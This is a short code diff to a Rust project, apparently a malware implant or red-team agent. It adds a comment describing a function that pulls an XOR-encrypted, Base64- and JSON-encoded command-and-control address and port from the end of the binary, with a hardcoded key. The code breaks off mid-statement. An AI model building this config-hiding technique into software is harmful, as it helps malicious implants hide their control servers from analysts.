@@ -4,6 +4,11 @@ use cfgparser_encryption;
 mod models;
 
 #[no_mangle]
+/// function designed to read the configuration bytes and
+/// return the C2 address. this will read the data from the
+/// end of the binary, XOR decrypt it, Base64 decode,
+/// JSON decode it, then grab the address and port from the
+/// Configuration struct that resulted from the JSON decoding.
 pub extern "C" fn read_cfg() {
     let key: &[u8] = "test".as_bytes();
     let msg = base64::engine::general_purpose::STANDARD_NO_PAD
